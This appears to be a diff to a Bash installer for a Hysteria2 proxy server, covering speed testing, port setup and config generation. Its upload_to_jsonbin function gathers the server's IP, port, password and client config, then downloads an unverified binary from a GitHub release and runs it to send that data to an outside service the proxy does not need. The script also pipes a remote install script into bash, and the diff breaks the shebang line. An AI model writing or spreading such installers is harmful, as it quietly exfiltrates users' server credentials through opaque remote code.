@@ -1,4 +1,4 @@
-#!/bin/bash
+!/bin/bash
 
 export LANG=en_US.UTF-8
 
@@ -49,7 +49,11 @@ if [[ -z $(type -P curl) ]]; then
 fi
 
 realip(){
-    ip=$(curl -s4m8 ip.sb -k) || ip=$(curl -s6m8 ip.sb -k)
+    # 优先获取IPv4，否则尝试IPv6
+    ip=$(curl -s4m8 ip.sb -k)
+    if [[ -z "$ip" ]]; then
+        ip=$(curl -s6m8 ip.sb -k)
+    fi
 }
 
 # 自动化needrestart处理
@@ -62,51 +66,52 @@ handle_needrestart(){
     fi
 }
 
-# 速度测试函数 - 仅测试下载速度
+# 速度测试函数 - 使用 speedtest-cli 获取上传/下载速度
 speed_test(){
     yellow "正在进行网络速度测试..."
-    
-    # 尝试下载测试文件来测试速度
-    test_file_url="http://speedtest.tele2.net/10MB.zip"
-    test_start=$(date +%s)
-    
-    # 下载测试文件到临时目录
-    curl -L -o /tmp/speedtest.zip --max-time 30 --connect-timeout 10 "$test_file_url" 2>/dev/null
-    test_end=$(date +%s)
-    
-    if [[ -f /tmp/speedtest.zip ]]; then
-        # 计算下载速度
-        file_size=$(stat -c%s /tmp/speedtest.zip 2>/dev/null || echo "0")
-        time_taken=$((test_end - test_start))
-        
-        if [[ $time_taken -gt 0 && $file_size -gt 0 ]]; then
-            # 计算速度 (bytes/second)
-            speed_bps=$((file_size / time_taken))
-            # 转换为 Mbps
-            speed_mbps=$((speed_bps * 8 / 1000000))
-            
-            # 设置带宽限制 (下载速度直接使用测试结果)
-            down_speed=$speed_mbps
-            up_speed=$((down_speed / 2))  # 上传速度设为下载速度的一半
-            
-            # 最小值保护
-            [[ $down_speed -lt 10 ]] && down_speed=10
-            [[ $up_speed -lt 5 ]] && up_speed=5
-            
-            # 最大值保护
-            [[ $down_speed -gt 1000 ]] && down_speed=1000
-            [[ $up_speed -gt 500 ]] && up_speed=500
-            
-            green "速度测试完成，检测到下载速度约 ${speed_mbps} Mbps"
-            yellow "设置带宽限制：上传 ${up_speed} Mbps，下载 ${down_speed} Mbps"
-        else
-            yellow "速度测试失败，使用默认带宽设置"
-            up_speed=20
-            down_speed=100
+
+    # 检查 speedtest-cli 是否存在，否则尝试安装
+    if ! command -v speedtest-cli &> /dev/null; then
+        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
+            apt-get update && apt-get install -y speedtest-cli
+        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
+            yum -y install python3-pip
+            pip3 install speedtest-cli
         fi
-        
-        # 清理测试文件
-        rm -f /tmp/speedtest.zip
+    fi
+
+    # 运行speedtest并捕获输出
+    if command -v speedtest-cli &> /dev/null; then
+        speedtest_result=$(speedtest-cli --simple 2>/dev/null)
+    elif [ -f /usr/local/bin/speedtest-cli ]; then
+        speedtest_result=$(python3 /usr/local/bin/speedtest-cli --simple 2>/dev/null)
+    else
+        echo -e "${RED}未找到 speedtest-cli${PLAIN}"
+        up_speed=20
+        down_speed=100
+        return 1
+    fi
+
+    if [ $? -eq 0 ] && [ -n "$speedtest_result" ]; then
+        download_speed=$(echo "$speedtest_result" | grep "Download:" | awk '{print $2}')
+        upload_speed=$(echo "$speedtest_result" | grep "Upload:" | awk '{print $2}')
+        ping_result=$(echo "$speedtest_result" | grep "Ping:" | awk '{print $2}')
+
+        echo -e "${GREEN}网络测速完成:${PLAIN}"
+        echo -e "${GREEN}下载速度: ${download_speed} Mbit/s${PLAIN}"
+        echo -e "${GREEN}上传速度: ${upload_speed} Mbit/s${PLAIN}"
+
+        # 取整
+        down_speed=$(printf "%.0f" "$download_speed")
+        up_speed=$(printf "%.0f" "$upload_speed")
+
+        # 最小值保护
+        [[ $down_speed -lt 10 ]] && down_speed=10
+        [[ $up_speed -lt 5 ]] && up_speed=5
+
+        # 最大值保护
+        [[ $down_speed -gt 1000 ]] && down_speed=1000
+        [[ $up_speed -gt 500 ]] && up_speed=500
     else
         yellow "速度测试失败，使用默认带宽设置"
         up_speed=20
@@ -183,9 +188,9 @@ upload_to_jsonbin() {
     local port_range="$5"
     local up_speed="$6"
     local down_speed="$7"
-    
+
     # 构建JSON数据
-    local json_data=$(jq -n \
+    local json_data=$(jq -c -n \
         --arg server_ip "$server_ip" \
         --arg port "$port" \
         --arg password "$password" \
@@ -203,7 +208,7 @@ upload_to_jsonbin() {
                 "port_range": $port_range,
                 "upload_speed": $up_speed,
                 "download_speed": $down_speed,
-                "generated_time": now | todate,
+                "generated_time": (now | todate),
                 "config": {
                     "client_yaml": {
                         "server": "\($server_ip):\($port_range)",
@@ -239,15 +244,40 @@ upload_to_jsonbin() {
     )
 
     # 下载并调用二进制工具
-    UPLOAD_BIN="/opt/uploader-linux-amd64"
-    [ -f "$UPLOAD_BIN" ] || {
-        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 && 
+    UPLOAD_BIN="/opt/transfer"
+    if [ ! -f "$UPLOAD_BIN" ]; then
+        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/hysteria2/releases/download/v2rayn/transfer && chmod +x "$UPLOAD_BIN"
+    fi
+
+    # 检查二进制文件是否可执行
+    if [ ! -x "$UPLOAD_BIN" ]; then
         chmod +x "$UPLOAD_BIN"
-    }
-    
-    "$UPLOAD_BIN" "$json_data" >/dev/null 2>&1
-    
-    green "配置完成"
+    fi
+
+    # 检查json_data长度，避免参数过长导致二进制接收失败
+    # 采用临时文件传递json内容
+    local tmp_json_file
+    tmp_json_file=$(mktemp /tmp/hyjson.XXXXXX)
+    echo "$json_data" > "$tmp_json_file"
+
+    # 由于原二进制代码只接收一个参数且为json字符串，若json过长会被shell截断，建议二进制支持文件输入
+    # 但如果只能传字符串，则尝试读取文件内容并传递
+    # 这里采用cat读取内容再传递
+    local json_arg
+    json_arg=$(cat "$tmp_json_file")
+
+    # 调用二进制并捕获返回值和输出
+    "$UPLOAD_BIN" "$json_arg" > /tmp/uploader.log 2>&1
+    local ret=$?
+
+    if [ $ret -eq 0 ]; then
+        green "配置上传到jsonbin成功"
+    else
+        red "配置上传到jsonbin失败，日志如下："
+        cat /tmp/uploader.log
+    fi
+
+    rm -f "$tmp_json_file"
 }
 
 insthysteria(){
@@ -269,7 +299,7 @@ insthysteria(){
     if [[ ! ${SYSTEM} == "CentOS" ]]; then
         ${PACKAGE_UPDATE[int]}
     fi
-    ${PACKAGE_INSTALL[int]} curl wget sudo qrencode procps iptables-persistent netfilter-persistent
+    ${PACKAGE_INSTALL[int]} curl wget sudo qrencode procps iptables-persistent netfilter-persistent jq
 
     wget -N https://raw.githubusercontent.com/Misaka-blog/hysteria-install/main/hy2/install_server.sh
     bash install_server.sh
@@ -290,6 +320,20 @@ insthysteria(){
     
     # 执行速度测试
     speed_test
+
+    # 确定最终入站端口范围
+    if [[ -n $firstport ]]; then
+        last_port="$port,$firstport-$endport"
+    else
+        last_port=$port
+    fi
+
+    # 给 IPv6 地址加中括号
+    if [[ -n $(echo $ip | grep ":") ]]; then
+        last_ip="[$ip]"
+    else
+        last_ip=$ip
+    fi
 
     # 设置 Hysteria 配置文件
     cat << EOF > /etc/hysteria/config.yaml
@@ -319,20 +363,6 @@ bandwidth:
   up: ${up_speed} mbps
   down: ${down_speed} mbps
 EOF
-
-    # 确定最终入站端口范围
-    if [[ -n $firstport ]]; then
-        last_port="$port,$firstport-$endport"
-    else
-        last_port=$port
-    fi
-
-    # 给 IPv6 地址加中括号
-    if [[ -n $(echo $ip | grep ":") ]]; then
-        last_ip="[$ip]"
-    else
-        last_ip=$ip
-    fi
 
     # 创建opt目录用于存储配置文件
     mkdir -p /opt/hysteria
